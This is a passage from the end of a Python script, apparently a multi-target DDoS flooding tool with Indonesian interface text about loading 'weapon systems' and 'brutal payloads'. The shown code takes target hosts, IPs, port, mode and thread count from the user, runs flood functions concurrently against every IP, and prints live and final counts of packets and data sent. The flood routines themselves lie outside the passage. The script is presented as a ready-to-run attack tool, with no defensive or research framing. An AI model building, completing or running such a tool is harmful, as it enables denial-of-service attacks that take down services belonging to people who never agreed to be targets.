                f"{Fore.CYAN}│{Style.RESET_ALL} "
                f"{Fore.RED}ERR:{Fore.WHITE}{Style.BRIGHT}{s['error']:>6,}{Style.RESET_ALL}"
            )

        tick += 1
        time.sleep(0.25)

# ---- MAIN ----

if __name__ == "__main__":
    os.system("clear" if os.name == "posix" else "cls")

    tampil_bebek()
    tampil_banner()
    tampil_ddos()

    loading_bar("Memuat sistem senjata...", 1.2)
    loading_bar("Menyiapkan payload brutal...", 1.0)
    spinner("Mengaktifkan mode multi-target...", 0.8)

    print()
    host, ips, port, mode, threads, ukuran = input_interaktif()

    loading_bar("Mengunci semua target...", 1.2)
    spinner("Membuka semua jalur serangan...", 0.8)

    tampil_info(host, ips, port, mode, threads, ukuran)

    init_stats(ips)

    lines = len(ips) + 2
    for _ in range(lines):
        print()

    stat_thread = threading.Thread(
        target=cetak_statistik,
        args=(ips, port, mode),
        daemon=True
    )
    stat_thread.start()

    per_ip = max(1, threads // len(ips))
    flood_fns = FLOOD_MAP.get(mode, ALL_FLOOD_FUNCTIONS)
    per_fn = max(1, per_ip // len(flood_fns))

    try:
        with ThreadPoolExecutor(max_workers=threads + 50) as pool:
            futures = []
            for ip in ips:
                for fn in flood_fns:
                    for _ in range(per_fn):
                        futures.append(pool.submit(fn, ip, port, ukuran))
            for f in futures:
                try:
                    f.result()
                except Exception:
                    pass

    except KeyboardInterrupt:
        RUNNING = False
        time.sleep(0.5)
        print(f"\n\n{Fore.RED}{Style.BRIGHT}{'═'*65}")
        print(f"  [✋] DIHENTIKAN")
        total_k = sum(s["kirim"] for s in stats_per_ip.values())
        total_e = sum(s["error"] for s in stats_per_ip.values())
        total_b = sum(s["bytes"] for s in stats_per_ip.values())
        for ip in ips:
            s = stats_per_ip[ip]
            print(f"  [{ip}] kirim: {s['kirim']:,} | error: {s['error']:,}")
        print(f"  [»] TOTAL KIRIM : {total_k:,}")
        print(f"  [»] TOTAL ERROR : {total_e:,}")
        print(f"  [»] TOTAL DATA  : {total_b/1_000_000:.2f} MB")
        print(f"{'═'*65}{Style.RESET_ALL}")
        sys.exit(0)
